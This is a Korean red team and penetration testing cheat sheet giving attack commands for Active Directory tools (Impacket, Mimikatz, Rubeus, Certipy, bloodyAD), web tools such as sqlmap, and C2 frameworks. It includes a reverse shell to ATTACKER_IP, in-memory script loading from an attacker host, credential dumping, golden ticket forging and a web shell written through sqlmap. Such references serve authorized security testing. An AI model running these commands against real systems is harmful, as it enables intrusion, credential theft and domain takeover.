# 도구 레퍼런스

실무에서 자주 사용하는 레드팀/펜테스팅 도구 모음. 각 도구의 핵심 용도와 주요 명령어를 정리한다.

---

## Impacket

Python 기반 Windows 네트워크 프로토콜 도구 모음. AD 공격의 핵심 도구.

| 스크립트 | 용도 | 주요 명령어 |
|---------|------|-----------|
| `secretsdump.py` | DCSync, SAM/NTDS 덤프 | `secretsdump.py DOMAIN/user:pass@DC_IP` |
| `GetNPUsers.py` | AS-REP Roasting | `GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass` |
| `GetUserSPNs.py` | Kerberoasting | `GetUserSPNs.py DOMAIN/user:pass -request` |
| `psexec.py` | PSEXEC 원격 실행 | `psexec.py DOMAIN/user:pass@TARGET` |
| `wmiexec.py` | WMI 원격 실행 | `wmiexec.py DOMAIN/user:pass@TARGET` |
| `smbexec.py` | SMB 원격 실행 | `smbexec.py DOMAIN/user:pass@TARGET` |
| `atexec.py` | Scheduled Task 원격 실행 | `atexec.py DOMAIN/user:pass@TARGET "cmd"` |
| `dcomexec.py` | DCOM 원격 실행 | `dcomexec.py DOMAIN/user:pass@TARGET` |
| `getTGT.py` | TGT 요청 | `getTGT.py DOMAIN/user:pass` |
| `getST.py` | Service Ticket 요청 | `getST.py -spn SPN -impersonate admin DOMAIN/user` |
| `ticketer.py` | Golden/Silver Ticket 생성 | `ticketer.py -nthash HASH -domain-sid SID -domain DOMAIN admin` |
| `ntlmrelayx.py` | NTLM Relay | `ntlmrelayx.py -tf targets.txt -smb2support` |
| `addcomputer.py` | Machine Account 추가 | `addcomputer.py DOMAIN/user:pass -computer-name FAKE$` |
| `rbcd.py` | RBCD 설정 | `rbcd.py -delegate-to TARGET$ -delegate-from FAKE$ -action write DOMAIN/user:pass` |
| `dacledit.py` | DACL 편집 | `dacledit.py -action write -rights DCSync DOMAIN/user:pass` |
| `owneredit.py` | Owner 변경 | `owneredit.py -action write -new-owner user -target target DOMAIN/user:pass` |
| `findDelegation.py` | Delegation 설정 조회 | `findDelegation.py DOMAIN/user:pass` |
| `changepasswd.py` | 비밀번호 변경 | `impacket-changepasswd DOMAIN/target:oldpass@DC -newpass newpass` |
| `lookupsid.py` | SID Brute Force | `lookupsid.py DOMAIN/user:pass@DC_IP` |
| `reg.py` | 원격 레지스트리 | `reg.py DOMAIN/user:pass@TARGET query -keyName HKLM\\...` |

### Kerberos 인증 사용 시

```bash
# 환경 변수 설정
export KRB5CCNAME=/path/to/ticket.ccache

# -k -no-pass 옵션으로 Kerberos 인증
secretsdump.py -k -no-pass DOMAIN/user@DC_FQDN
psexec.py -k -no-pass DOMAIN/user@TARGET_FQDN
wmiexec.py -k -no-pass DOMAIN/user@TARGET_FQDN
```

### Hash 인증 (Pass-the-Hash)

```bash
# -hashes 옵션
secretsdump.py -hashes :NTHASH DOMAIN/user@DC_IP
psexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP
wmiexec.py -hashes :NTHASH DOMAIN/user@TARGET_IP
```

---

## PowerView

AD 열거 및 DACL 분석을 위한 PowerShell 도구 (PowerSploit 모듈).

```powershell
# 모듈 로드
Import-Module .\PowerView.ps1
# 또는 메모리에서 직접 로드
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerView.ps1')

# 도메인 정보
Get-Domain
Get-DomainController

# 사용자 열거
Get-DomainUser | select samaccountname, description, memberof
Get-DomainUser -SPN  # Kerberoastable 계정
Get-DomainUser -PreauthNotRequired  # AS-REP Roastable

# 그룹 열거
Get-DomainGroup -Identity "Domain Admins" | select member
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# 컴퓨터 열거
Get-DomainComputer | select dnshostname, operatingsystem
Get-DomainComputer -Unconstrained  # Unconstrained Delegation

# ACL 분석
Find-InterestingDomainAcl -ResolveGUIDs  # 악용 가능한 ACL 탐색
Get-DomainObjectAcl -Identity "target_user" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner"}

# 로컬 관리자 탐색
Find-LocalAdminAccess  # 현재 사용자가 로컬 관리자인 호스트 탐색

# 세션 열거
Get-NetSession -ComputerName DC01
Get-NetLoggedOn -ComputerName TARGET

# 도메인 신뢰
Get-DomainTrust
Get-ForestTrust

# GPO 분석
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup  # GPO를 통한 로컬 그룹 매핑
```

---

## NetExec (nxc)

CrackMapExec의 후속 도구. 네트워크 인증 및 열거 자동화.

```bash
# SMB 인증 확인
nxc smb TARGET -u user -p pass
nxc smb TARGET -u user -H NTHASH

# 다수 호스트 스캔
nxc smb 10.10.10.0/24 -u user -p pass

# 공유 폴더 열거
nxc smb TARGET -u user -p pass --shares

# 사용자 열거
nxc smb TARGET -u user -p pass --users
nxc smb TARGET -u user -p pass --rid-brute

# Password Spray
nxc smb TARGET -u users.txt -p 'Password1!' --continue-on-success

# SAM 덤프
nxc smb TARGET -u admin -p pass --sam

# LSA 덤프
nxc smb TARGET -u admin -p pass --lsa

# NTDS 덤프 (DC)
nxc smb DC_IP -u admin -p pass --ntds

# 명령 실행
nxc smb TARGET -u admin -p pass -x "whoami"
nxc winrm TARGET -u admin -p pass -x "whoami"

# LDAP 열거
nxc ldap DC_IP -u user -p pass --users
nxc ldap DC_IP -u user -p pass --groups
nxc ldap DC_IP -u user -p pass --kerberoasting
nxc ldap DC_IP -u user -p pass --asreproast

# MSSQL
nxc mssql TARGET -u user -p pass -x "whoami"
nxc mssql TARGET -u user -p pass --local-auth

# Kerberos 인증
nxc smb TARGET -u user -p pass -k
nxc smb TARGET --use-kcache
```

---

## Certipy

AD Certificate Services (ADCS) 공격 전문 도구.

```bash
# 취약한 템플릿 찾기
certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable

# ESC1 공격
certipy req -u user@domain -p pass -ca CA-NAME -template TEMPLATE \
  -target DC_IP -upn administrator@domain

# ESC4 공격 (템플릿 수정)
certipy template -u user@domain -p pass -template TEMPLATE \
  -save-old -target DC_IP

# 인증서로 인증
certipy auth -pfx admin.pfx -dc-ip DC_IP

# NTLM 해시 획득
certipy auth -pfx admin.pfx -dc-ip DC_IP  # NT hash 출력

# Shadow Credentials
certipy shadow auto -u user@domain -p pass -account target$

# Kerberos 인증
certipy find -u user@domain -k -no-pass -dc-ip DC_IP
```

---

## BloodHound

AD 관계 시각화 및 공격 경로 탐색.

### 수집 (SharpHound / bloodhound-python)

```bash
# bloodhound-python (Linux)
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all

# Kerberos 인증
bloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all -k

# SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --domain domain.local --ldapusername user --ldappassword pass

# BloodHound CE (Community Edition) - API 수집
# bloodhound-ce-python 사용
```

### 주요 Cypher 쿼리

```cypher
-- Kerberoastable 사용자
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name

-- Domain Admin 최단 경로
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

-- Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

-- DACL 기반 경로
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner*1..]->(t)
RETURN p
```

---

## Evil-WinRM

WinRM 기반 원격 쉘. 파일 전송, PowerShell 모듈 로드 지원.

```bash
# 기본 접속
evil-winrm -i TARGET -u user -p pass

# Hash 접속
evil-winrm -i TARGET -u user -H NTHASH

# Kerberos 접속
evil-winrm -i TARGET -r DOMAIN

# 파일 전송
upload /local/path /remote/path
download /remote/path /local/path

# PowerShell 스크립트 로드
evil-winrm -i TARGET -u user -p pass -s /scripts/dir
menu  # 로드된 함수 확인
Invoke-Function  # 실행

# DLL 로드
evil-winrm -i TARGET -u user -p pass -e /dll/dir
Dll-Loader -http http://attacker/payload.dll
```

---

## bloodyAD

AD DACL 남용 및 객체 조작 전문 도구.

```bash
# 비밀번호 변경
bloodyAD -d domain -u user -p pass --host DC_IP set password target 'NewPass123!'

# 그룹 멤버 추가
bloodyAD -d domain -u user -p pass --host DC_IP add groupMember "GROUP" "user"

# SPN 설정 (Targeted Kerberoasting)
bloodyAD -d domain -u user -p pass --host DC_IP set object target servicePrincipalName -v "MSSQLSvc/fake:1433"

# Shadow Credentials
bloodyAD -d domain -u user -p pass --host DC_IP add shadowCredentials target

# RBCD 설정
bloodyAD -d domain -u user -p pass --host DC_IP add rbcd target fake$

# Owner 변경
bloodyAD -d domain -u user -p pass --host DC_IP set owner target user

# GenericAll 권한 부여
bloodyAD -d domain -u user -p pass --host DC_IP add genericAll target user

# 객체 정보 조회
bloodyAD -d domain -u user -p pass --host DC_IP get object target

# DACL 조회
bloodyAD -d domain -u user -p pass --host DC_IP get writable --otype USER --right WRITE
```

---

## Rubeus

Windows Kerberos 공격 도구 (.NET).

```powershell
# AS-REP Roasting
.\Rubeus.exe asreproast /outfile:hashes.txt

# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt

# TGT 요청
.\Rubeus.exe asktgt /user:user /password:pass /ptt

# Pass-the-Ticket
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Overpass-the-Hash
.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt

# S4U (Constrained Delegation)
.\Rubeus.exe s4u /user:svc$ /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target /ptt

# Golden Ticket
.\Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:admin /ptt

# 현재 세션 티켓 조회
.\Rubeus.exe triage
.\Rubeus.exe klist

# 티켓 덤프
.\Rubeus.exe dump

# 모니터링 (새 TGT 감시)
.\Rubeus.exe monitor /interval:5 /nowrap
```

---

## Mimikatz

Windows 자격 증명 덤프 및 조작 도구.

```powershell
# 기본 실행
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# NTLM 해시 & 평문 비밀번호 덤프
sekurlsa::logonpasswords

# SAM 덤프
lsadump::sam

# DCSync
lsadump::dcsync /user:DOMAIN\krbtgt
lsadump::dcsync /user:DOMAIN\Administrator

# Pass-the-Hash
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# Golden Ticket
kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket
kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-... /target:server /service:cifs /rc4:HASH /ptt

# 티켓 추출
sekurlsa::tickets /export

# DPAPI
dpapi::masterkey /in:masterkey /sid:SID /password:pass
dpapi::cred /in:credential /masterkey:KEY

# LSASS 미니덤프에서 추출
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

---

## Responder

LLMNR/NBT-NS/mDNS 포이즈닝 및 NTLM 해시 캡처.

```bash
# 기본 실행 (모든 포이즈닝)
sudo responder -I eth0

# 분석 모드 (포이즈닝 없이 트래픽 감시)
sudo responder -I eth0 -A

# HTTP/SMB 서버로 해시 캡처
sudo responder -I eth0 -wrf

# 특정 프로토콜 비활성화 (ntlmrelayx와 함께 사용 시)
# Responder.conf에서 SMB = Off, HTTP = Off 설정 후
sudo responder -I eth0

# 캡처된 해시 위치
/usr/share/responder/logs/
```

---

## Hashcat

GPU 기반 해시 크래킹 도구.

```bash
# 주요 해시 모드
# 1000  - NTLM
# 5600  - NetNTLMv2
# 13100 - Kerberoast (TGS-REP etype 23)
# 18200 - AS-REP Roast
# 0     - MD5
# 3200  - bcrypt
# 1800  - sha512crypt (Linux)
# 500   - md5crypt (Linux)

# NTLM 크래킹
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Kerberoast
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AS-REP Roast
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt

# Rule 기반
hashcat -m 1000 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# 마스크 공격
hashcat -m 1000 hash.txt -a 3 '?u?l?l?l?l?d?d?d!'

# 결과 확인
hashcat -m 1000 hash.txt --show
```

---

## 웹 공격 도구

### ffuf

```bash
# 디렉토리 퍼징
ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# 파일 퍼징
ffuf -u http://TARGET/FUZZ -w wordlist.txt -e .php,.asp,.aspx,.txt,.bak

# 서브도메인 퍼징
ffuf -u http://TARGET -H "Host: FUZZ.domain.com" -w subdomains.txt -fs SIZE

# 파라미터 퍼징
ffuf -u http://TARGET/page?FUZZ=test -w params.txt -fs SIZE

# POST 데이터 퍼징
ffuf -u http://TARGET/login -X POST -d "user=admin&pass=FUZZ" -w passwords.txt -fc 401

# 헤더 추가
ffuf -u http://TARGET/FUZZ -w wordlist.txt -H "Cookie: session=abc123"

# 필터/매치
ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301 -fc 404 -fs 0
```

### Gobuster

```bash
# 디렉토리
gobuster dir -u http://TARGET -w wordlist.txt -t 50

# 파일 확장자
gobuster dir -u http://TARGET -w wordlist.txt -x php,asp,txt -t 50

# 서브도메인
gobuster dns -d domain.com -w subdomains.txt -t 50

# VHOST
gobuster vhost -u http://TARGET -w subdomains.txt --append-domain

# 상태 코드 필터
gobuster dir -u http://TARGET -w wordlist.txt -s 200,301,302
```

### sqlmap

```bash
# 기본 테스트
sqlmap -u "http://TARGET/page?id=1" --batch

# POST 요청
sqlmap -u "http://TARGET/login" --data "user=admin&pass=test" --batch

# 쿠키/헤더 포함
sqlmap -u "http://TARGET/page?id=1" --cookie "session=abc" --batch

# DB 열거
sqlmap -u "http://TARGET/page?id=1" --dbs
sqlmap -u "http://TARGET/page?id=1" -D dbname --tables
sqlmap -u "http://TARGET/page?id=1" -D dbname -T table --dump

# OS Shell
sqlmap -u "http://TARGET/page?id=1" --os-shell

# WAF 우회
sqlmap -u "http://TARGET/page?id=1" --tamper=space2comment,between --random-agent

# 파일 읽기/쓰기 (MySQL)
sqlmap -u "http://TARGET/page?id=1" --file-read="/etc/passwd"
sqlmap -u "http://TARGET/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Burp Suite 팁

```text
# 유용한 확장 프로그램
- Autorize         : 권한 상승 테스트 자동화
- JSON Web Tokens  : JWT 분석/조작
- Param Miner      : 숨겨진 파라미터 탐색
- Active Scan++    : 스캔 기능 강화
- Turbo Intruder   : 고속 Intruder
- Logger++         : 상세 로그

# Intruder Payload 위치
§PAYLOAD§ 로 마킹

# Match & Replace 규칙으로 헤더 자동 조작
```

---

## 리버스 쉘 도구

### Netcat / ncat

```bash
# 리스너
nc -lvnp 4444
ncat -lvnp 4444 --ssl  # 암호화

# 연결
nc ATTACKER_IP 4444 -e /bin/bash
```

### pwncat-cs

```bash
# 리스너
pwncat-cs -lp 4444

# 자동 쉘 업그레이드 + 파일 전송 + 열거
# 연결 후 Ctrl+D로 pwncat 프롬프트 진입
upload /local/file /remote/path
download /remote/file /local/path
run enumerate
```

### rlwrap

```bash
# readline wrapper (화살표 키, 히스토리)
rlwrap nc -lvnp 4444
```

---

## 파일 전송

```bash
# Python HTTP 서버
python3 -m http.server 8080

# curl/wget 다운로드
curl http://ATTACKER/file -o /tmp/file
wget http://ATTACKER/file -O /tmp/file

# PowerShell 다운로드
iwr http://ATTACKER/file -outfile C:\temp\file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file','C:\temp\file')

# Certutil (Windows)
certutil -urlcache -split -f http://ATTACKER/file C:\temp\file

# SMB 서버 (Impacket)
impacket-smbserver share /path -smb2support
# Windows에서 접근
copy \\ATTACKER\share\file C:\temp\file

# SCP
scp file user@TARGET:/tmp/file
scp user@TARGET:/remote/file /local/path

# Base64 전송
base64 -w0 file | clip  # 복사
echo "BASE64_DATA" | base64 -d > /tmp/file
```

---

## 기타 유용한 도구

| 도구 | 용도 | 설치/링크 |
|------|------|----------|
| `ligolo-ng` | 터널링/피봇 (사용 편의성 최고) | [GitHub](https://github.com/nicocha30/ligolo-ng) |
| `chisel` | TCP/UDP 터널링 | [GitHub](https://github.com/jpillora/chisel) |
| `kerbrute` | Kerberos 기반 사용자 열거/Password Spray | [GitHub](https://github.com/ropnop/kerbrute) |
| `enum4linux-ng` | SMB/RPC/LDAP 열거 (Python 재작성) | [GitHub](https://github.com/cddmp/enum4linux-ng) |
| `LinPEAS` | Linux 권한 상승 벡터 탐색 | [GitHub](https://github.com/carlospolop/PEASS-ng) |
| `WinPEAS` | Windows 권한 상승 벡터 탐색 | [GitHub](https://github.com/carlospolop/PEASS-ng) |
| `PowerUp.ps1` | Windows 서비스/특권 악용 탐색 | PowerSploit |
| `Seatbelt` | Windows 보안 설정 감사 | GhostPack |
| `SharpUp` | PowerUp의 C# 버전 | GhostPack |
| `ADModule` | ActiveDirectory PowerShell 모듈 (RSAT 없이) | [GitHub](https://github.com/samratashok/ADModule) |
| `PowerView` | AD 열거 PowerShell 스크립트 | PowerSploit |
| `Covenant` | C2 프레임워크 (.NET) | [GitHub](https://github.com/cobbr/Covenant) |
| `Sliver` | Go 기반 C2 프레임워크 | [GitHub](https://github.com/BishopFox/sliver) |
| `Havoc` | C2 프레임워크 | [GitHub](https://github.com/HavocFramework/Havoc) |
| `CrackStation` | 온라인 해시 룩업 | [crackstation.net](https://crackstation.net) |
| `PayloadsAllTheThings` | 페이로드 치트시트 모음 | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| `SecLists` | 워드리스트 모음 | [GitHub](https://github.com/danielmiessler/SecLists) |

---

## 모던 도구 모음

최신 공격/방어 트렌드에 맞춘 도구들을 한곳에 정리. 운영환경 영향이 큰 도구는 사전 허가와 제한 범위에서만 사용.

!!! warning "OPSEC"
  대규모 스캔/에뮬레이션은 탐지 신호가 큽니다. 사전 승인을 받고, 스코프/레이트리밋을 줄이고, 실험 환경에서 먼저 재현하세요.

### ProjectDiscovery 스위트

| 도구 | 용도 | 예시 |
|------|------|------|
| `subfinder` | 서브도메인 수집 | `subfinder -d example.com -all -o subs.txt` |
| `dnsx` | 대량 DNS 확인 | `dnsx -l subs.txt -resp-only -o alive.txt` |
| `httpx` | 대량 HTTP 핑거프린팅 | `httpx -l alive.txt -status-code -title -tech-detect -o web.txt` |
| `naabu` | 대량 포트 스캔 | `naabu -list alive.txt -top-ports 1000 -o ports.txt` |
| `nuclei` | 취약점 템플릿 스캔 | `nuclei -l web.txt -severity medium,high,critical -o vulns.txt` |
| `katana` | 고속 크롤러 | `katana -u https://target -js-crawl -o urls.txt` |

설치: `go install -v github.com/projectdiscovery/{subfinder,dnsx,httpx,naabu,nuclei,katana}/cmd/...@latest`

### 클라우드 / 컨테이너

| 도구 | 용도 | 예시 |
|------|------|------|
| `Stratus Red Team` | AWS/Azure/GCP 공격 기법 에뮬레이션 | `stratus run aws.credential-access.secretsmanager` |
| `Prowler` | AWS 보안 점검 (CIS/머티리얼) | `prowler aws -M csv,json -S` |
| `ScoutSuite` | 멀티클라우드 구성 감사 | `scout aws --report-dir reports/` |
| `Pacu` | AWS 공격 프레임워크 | `pacu` → 세션 생성 후 모듈 실행 |
| `CloudFox` | 멀티클라우드 권한/경로 탐색 | `cloudfox enum --aws --profile prof` |
| `kubescape` | K8s 보안 스캔 | `kubescape scan framework nsa` |
| `kube-hunter` | K8s 공격 표면 탐색 | `kube-hunter --remote some.cluster.local` |
| `trivy` | 컨테이너/코드/이미지 취약점 | `trivy image registry/repo:tag` |

### eBPF 가시성/탐지

| 도구 | 용도 | 예시 |
|------|------|------|
| `Tetragon` | 런타임 정책/이벤트 관찰 (Cilium) | Helm 배포 후 `tetra get events` |
| `Falco` | 커널 이상행위 탐지 (CNCF) | `falco` (드라이버/eBPF 모드) |
| `Tracee` | 런타임 이벤트 트레이싱 (Aqua) | `tracee --security-alerts` |

참고: 실환경에서는 탐지/차단 정책이 에이전트로 강제될 수 있습니다. PoC는 격리된 테스트 클러스터에서 수행하세요.

### C2 / 에뮬레이션

| 도구 | 용도 | 빠른 시작 |
|------|------|---------|
| `Mythic` | 확장형 C2 프레임워크 | `git clone https://github.com/its-a-feature/Mythic && cd Mythic && ./mythic-cli start` |
| `Caldera` | 공격 시뮬레이션 (MITRE ATT&CK) | `git clone https://github.com/mitre/caldera && pip install -r requirements.txt && python server.py --insecure` |
| `Sliver` | Go 기반 C2 (이미 위 표 참고) | `sliver-server` → Implant 생성/리스너 구성 |

### 자산/콘텐츠 수집 보조

| 도구 | 용도 | 예시 |
|------|------|------|
| `cariddi` | URL 파라미터/엔드포인트 수집 | `cat urls.txt | cariddi -plugins all -o found.txt` |
| `gau` | 과거 아카이브 URL 수집 | `echo target.com | gau --providers wayback,commoncrawl` |
| `waybackurls` | Wayback 기반 URL 수집 | `cat domains.txt | waybackurls > urls.txt` |

